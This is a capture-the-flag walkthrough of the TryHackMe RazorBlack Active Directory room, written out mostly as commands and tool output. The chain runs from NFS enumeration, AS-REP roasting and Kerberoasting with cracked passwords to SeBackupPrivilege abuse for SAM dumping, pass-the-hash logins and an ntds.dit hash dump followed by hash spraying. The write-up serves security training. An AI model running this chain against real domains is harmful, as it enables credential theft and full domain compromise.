# **RazorBlack - TryHackMe**

*Target Ip. Address: 10.48.128.121*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.128.121
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 17:11 +0545
Nmap scan report for 10.48.128.121
Host is up (0.036s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-28 11:36:17Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-28T11:37:08+00:00; +9m56s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-28T11:37:00+00:00
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2026-02-27T11:30:11
|_Not valid after:  2026-08-29T11:30:11
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-28T11:37:01
|_  start_date: N/A
|_clock-skew: mean: 9m56s, deviation: 0s, median: 9m56s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.64 seconds
```

We have a standard Active Directory services running. Specially services like smb, nfs, rdp, winrm, etc. can be noted. We will add the findings in the hosts file.

```bash
kali@klai:cat /etc/hosts                                                                                                                                 
10.48.128.121   HAVEN-DC.raz0rblack.thm HAVEN-DC raz0rblack.thm raz0rblack
 
127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Let's start with smb, checking if we have guest logon allowed.

```bash
kalI@kali:smbclient -L //10.48.128.121                                                                                                                   
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.128.121 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

So, no smb login allowed. Then, let's head to nfs service.

```bash
kali@kali:showmount -e 10.48.128.121                                                                                                                     
Export list for 10.48.128.121:
/users (everyone)
```

We can mount it on our machine.

```bash
kali@kali:sudo mount -t nfs -o nfsvers=3 10.48.128.121:/users /tmp/remote                                                                                
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
```

Let's see what it has for us.

```bash
kali@kali:ls                                                                                                                                             
employee_status.xlsx  sbradley.txt
```

We find a flag here.

```bash
kali@kali:cat sbradley.txt 
  THM{ab.....04}
```

Let's check the file type, so that we can proceed with it as I am in linux system.

```bash
kali@kali:file employee_status.xlsx 
employee_status.xlsx: Microsoft Excel 2007+
```

So, we have a excel sheet, we can create a simple python script to dump the data.

```bash
kali@kali:cat extract.py                                                                                                                                 
import pandas as pd
df = pd.DataFrame(pd.read_excel("/tmp/remote/employee_status.xlsx"))
print(df)
```

Let's run the script.

```bash
kali@kali:python3 extract.py                                                                                                                             
   HAVEN SECRET HACKER's CLUB  Unnamed: 1  Unnamed: 2                                    Unnamed: 3
0                         NaN         NaN         NaN                                           NaN
1                         NaN         NaN         NaN                                           NaN
2                         NaN         NaN         NaN                                           NaN
3                      Name's         NaN         NaN                                          Role
4                  daven port         NaN         NaN                                    CTF PLAYER
5                imogen royce         NaN         NaN                                    CTF PLAYER
6                tamara vidal         NaN         NaN                                    CTF PLAYER
7              arthur edwards         NaN         NaN                                    CTF PLAYER
8                 carl ingram         NaN         NaN                         CTF PLAYER (INACTIVE)
9               nolan cassidy         NaN         NaN                                    CTF PLAYER
10                reza zaydan         NaN         NaN                                    CTF PLAYER
11           ljudmila vetrova         NaN         NaN  CTF PLAYER, DEVELOPER,ACTIVE DIRECTORY ADMIN
12               rico delgado         NaN         NaN                                WEB SPECIALIST
13             tyson williams         NaN         NaN                           REVERSE ENGINEERING
14             steven bradley         NaN         NaN                              STEGO SPECIALIST
15                chamber lin         NaN         NaN                          CTF PLAYER(INACTIVE)
```

So, we have now some usernames. Let's keep them in a list.

```bash
kali@kali:cat users.txt
tvidal
aedwards
cingram
ncassidy
lvetrova
rdelgado
twilliams
sbradley
clin
```

Since, we have usernames, let's try AS-REP Roasting, to see if we can get any hashes.

```bash
kali@kali:impacket-GetNPUsers raz0rblack.thm/ -usersfile users.txt -format hashcat                                                                   
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:e85453.....0d494a5
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

We got a AS-REP hash for user twilliams. Let's crack it using john.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                          
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ro...es    ($krb5asrep$23$twilliams@RAZ0RBLACK.THM)     
1g 0:00:00:03 DONE (2026-02-28 17:31) 0.2604g/s 1099Kp/s 1099Kc/s 1099KC/s rob3560..roastedfish
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Since, we have a valid set of credentials, let's start bloodhound to get a view on this Active Directory.

```bash
kali@kali:bloodhound-python -u 'twilliams' -p 'ro...es' -d 'raz0rblack.thm' -dc 'HAVEN-DC.raz0rblack.thm' -ns 10.48.128.121 --dns-tcp -c All       
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: raz0rblack.thm
INFO: Getting TGT for user
INFO: Connecting to LDAP server: HAVEN-DC.raz0rblack.thm
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: HAVEN-DC.raz0rblack.thm
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: HAVEN-DC.raz0rblack.thm
WARNING: Failed to get service ticket for HAVEN-DC.raz0rblack.thm, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 11S
```

So, user twilliams cannot login via RDP nor winrm. But we have a very interesting find.

<img width="1204" height="858" alt="image" src="https://github.com/user-attachments/assets/1b6afcd2-47a6-4d43-b8ac-8eb034d7eeb2" />

<img width="1206" height="854" alt="image" src="https://github.com/user-attachments/assets/f9b0291d-828e-496b-9d57-031a8d9ad4d2" />

User xyan1d3 is kerberostable, and is part of Backup Operaters, which basically means a straight way to Administrator, if we can crack the kerberos ticket.

```bash
kali@kali:impacket-GetUserSPNs raz0rblack.thm/twilliams:ro...es -dc-ip 10.48.128.121 -request -outputfile hashes.kerberoast
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 21:02:17.715160  <never>               



[-] CCache file is not found. Skipping...
```

We got the ticket for user xyan1d3, let's crack it.

```bash
kali@kali:john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt                                                                             
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cy...28 (?)     
1g 0:00:00:04 DONE (2026-02-28 17:51) 0.2433g/s 2157Kp/s 2157Kc/s 2157KC/s cybermilk0..cy2802341
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

That was successful. Now, we can login as user xyan1d3 via evil-winrm.

```bash
kali@kali:evil-winrm -i 10.48.128.121 -u xyan1d3 -p 'cy...28'                                                                                  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami
raz0rblack\xyan1d3
```

Let's recheck the privileges, just to be sure.

```bash
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We have 'SeBackupPrivilege' enabled. Let's go...

```bash
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> reg save hklm\system system
The operation completed successfully.
```

Bring them over to attacker machine to crack them.

```bash
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> download sam
                                        
Info: Downloading C:\Users\xyan1d3\Documents\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> download system
                                        
Info: Downloading C:\Users\xyan1d3\Documents\system to system
                                        
Info: Download successful!
```

Let's get the admin hash.

```bash
kali@kali:impacket-secretsdump -sam sam -system system local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xf1582a79dd00631b701d3d15e75e59f6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:96...0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

Now, we can login as Administrator. That is basically system pwn, but we need to get all the flags.

```bash
kali@kali:evil-winrm -i 10.48.128.121 -u Administrator -H 96...0c
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
raz0rblack\administrator
```

Let's search for flags.

```bash
*Evil-WinRM* PS C:\Users\Administrator> dir
                                                                                                                                                   
                                                                                                                                                   
    Directory: C:\Users\Administrator                                                                                                              
                                                                                                                                                   
                                                                                                                                                   
Mode                LastWriteTime         Length Name                                                                                              
----                -------------         ------ ----                                                                                              
d-r---        5/21/2021   9:45 AM                3D Objects                                                                                        
d-r---        5/21/2021   9:45 AM                Contacts                                                                                          
d-r---        5/21/2021   9:45 AM                Desktop                                                                                           
d-r---        5/21/2021   9:45 AM                Documents                                                                                         
d-r---        5/21/2021   9:45 AM                Downloads
d-r---        5/21/2021   9:45 AM                Favorites
d-r---        5/21/2021   9:45 AM                Links
d-r---        5/21/2021   9:45 AM                Music
d-r---        5/21/2021   9:45 AM                Pictures
d-r---        5/21/2021   9:45 AM                Saved Games
d-r---        5/21/2021   9:45 AM                Searches
d-r---        5/21/2021   9:45 AM                Videos
-a----        2/25/2021   1:08 PM            290 cookie.json
-a----        2/25/2021   1:12 PM           2512 root.xml
```

We have a xml file. Let's see what it is.

```bash
*Evil-WinRM* PS C:\Users\Administrator> type root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6.....67656e63792e0a</SS>
  </Obj>
</Objs>
```

We have a very long hex characters. Let's decode it.

```bash
kali@kali:echo "44616d6.....6167656e63792e0a" | xxd -r -p
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{1b.....0d}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
```

That was great. Let's hunt for other flags.

```bash
*Evil-WinRM* PS C:\Users\twilliams> dir


    Directory: C:\Users\twilliams


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:18 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de                                       finitely_definitely_not_a_flag.exe
```

This is definitely a flag.

```bash
*Evil-WinRM* PS C:\Users\twilliams> type definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
THM{51.....b0}
```

Let's dive deeper, to get more flags.

```bash
*Evil-WinRM* PS C:\Users\xyan1d3> dir


    Directory: C:\Users\xyan1d3


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/28/2026   4:10 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml
```

We have another xml file.

```bash
*Evil-WinRM* PS C:\Users\xyan1d3> type xyan1d3.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Nope your flag is not here</S>
      <SS N="Password">01000000d08c9dd.....d7285726da2</SS>
    </Props>
  </Obj>
</Objs>
```

That XML file contains a PSCredential object exported using the Export-Clixml cmdlet. The long string in the <SS N="Password"> field is a SecureString. By default, PowerShell uses the Windows Data Protection API (DPAPI) to encrypt these strings, we can decrypt it with following steps.

```bash
*Evil-WinRM* PS C:\Users\xyan1d3> $cred = Import-Clixml -Path xyan1d3.xml
*Evil-WinRM* PS C:\Users\xyan1d3> $cred.GetNetworkCredential().Password
LOL here it is -> THM{62.....bb}
```

We have 2 more 4 more answers to fill. We also find a similar .xml file in lvetrova's directory. Since, we haven't still logged in as user lvetrova, we will do it later. We will refrain from changing passwords, to respect this challenge. We will go as per the intended path, although we already broke it.

```bash
*Evil-WinRM* PS C:\Users\lvetrova> dir


    Directory: C:\Users\lvetrova


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:14 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:16 AM           1692 lvetrova.xml
```

Let's search for other answers first.

```bash
*Evil-WinRM* PS C:\Program Files\Top Secret> dir


    Directory: C:\Program Files\Top Secret


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2021  10:13 AM         449195 top_secret.png
```

We find a top_secret.png file. Let's download it and see, what it is.

```bash
*Evil-WinRM* PS C:\Program Files\Top Secret> download top_secret.png
                                        
Info: Downloading C:\Program Files\Top Secret\top_secret.png to top_secret.png
                                        
Info: Download successful!
```

<img width="585" height="578" alt="Screenshot 2026-02-28 182632" src="https://github.com/user-attachments/assets/d64c28f0-152a-4f41-bb42-55dbfe2e2a5c" />

The answer for this one is ':wq'.

That, been done. Let's see the shares available.

```bash
*Evil-WinRM* PS C:\Program Files\Top Secret> Get-SmbShare

Name     ScopeName Path                                            Description
----     --------- ----                                            -----------
ADMIN$   *         C:\Windows                                      Remote Admin
C$       *         C:\                                             Default share
IPC$     *                                                         Remote IPC
NETLOGON *         C:\Windows\SYSVOL\sysvol\raz0rblack.thm\SCRIPTS Logon server share
SYSVOL   *         C:\Windows\SYSVOL\sysvol                        Logon server share
trash    *         C:\windows\trash                                Files Pending for deletion
```

We have a trash share, which seems interesting.

```bash
*Evil-WinRM* PS C:\windows\trash> ls


    Directory: C:\windows\trash


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2021  11:29 AM           1340 chat_log_20210222143423.txt
-a----        3/15/2021  11:02 PM       18927164 experiment_gone_wrong.zip
-a----        2/27/2021  11:24 AM             37 sbradley.txt
```

We get the zip file, which password we need to crack as per the questions from this challenge.

```bash
*Evil-WinRM* PS C:\windows\trash> type chat_log_20210222143423.txt
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....

The administrator died after this incident.

Press F to pay respects
```

So, we will have the ntds.dit and SYSTEM.hive on this zip file. Let's download it on our attacker machine to crack it's password.

```bash
*Evil-WinRM* PS C:\windows\trash> download experiment_gone_wrong.zip
                                        
Info: Downloading C:\windows\trash\experiment_gone_wrong.zip to experiment_gone_wrong.zip
                                        
Info: Download successful!
```

Let's crack it with john the ripper.

```bash
kali@kali:zip2john experiment_gone_wrong.zip > hash
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2 ts=591C cs=591c type=8
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87 ts=5873 cs=5873 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```
```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
el...mo (experiment_gone_wrong.zip)     
1g 0:00:00:00 DONE (2026-02-28 18:34) 1.639g/s 13738Kp/s 13738Kc/s 13738KC/s elfo2009..elboty2009
Use the "--show" option to display all of the cracked passwords reliably                                                                           
Session completed.
```

So, let's extract the files from the zip file.

```bash
kali@kali:unzip experiment_gone_wrong.zip                                                                                                                
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password: 
  inflating: system.hive             
  inflating: ntds.dit 
```

Let's dump the hashes.

```bash
kali@kali:impacket-secretsdump -ntds ntds.dit -system system.hive local > hashes
```
```bash
kali@kali:cat hashes | cut -d ":" -f 4 > clean_hash.txt
```

Since, there are many hashes, we will do hash spray to determine has for lvetrova.

```bash
kali@kali:crackmapexec smb 10.48.128.121 -u lvetrova -H clean_hash.txt                                                                                   
SMB         10.48.128.121   445    HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.48.128.121   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:1afedc472d0fdfe07cd075d36804efd0 STATUS_LOGON_FAILURE 
SMB         10.48.128.121   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         10.48.128.121   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:4ea59b8f64c94ec66ddcfc4e6e5899f9 STATUS_LOGON_FAILURE 
SMB         10.48.128.121   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:703a365974d7c3eeb80e11dd27fb0cb3 STATUS_LOGON_FAILURE
.
.
.
.
.
SMB         10.48.128.121   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:081af9630677a387f6f0a9bb17852602 STATUS_LOGON_FAILURE 
SMB         10.48.128.121   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:c184a72ed800899bc1ff633778a89b5e STATUS_LOGON_FAILURE 
SMB         10.48.128.121   445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f2...1d
```

We got the hash, let's use the hash to login as user lvetrova and get the final flag.

```bash
kali@kali:evil-winrm -i 10.49.156.126 -u lvetrova -H f2...1d
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\lvetrova\Documents>
```

The .xml file we have is similar to the one we had before, so we will use the same technique.

```bash
*Evil-WinRM* PS C:\Users\lvetrova> $cred = Import-Clixml -Path lvetrova.xml
*Evil-WinRM* PS C:\Users\lvetrova> $cred.GetNetworkCredential().Password
THM{69.....e4}
```
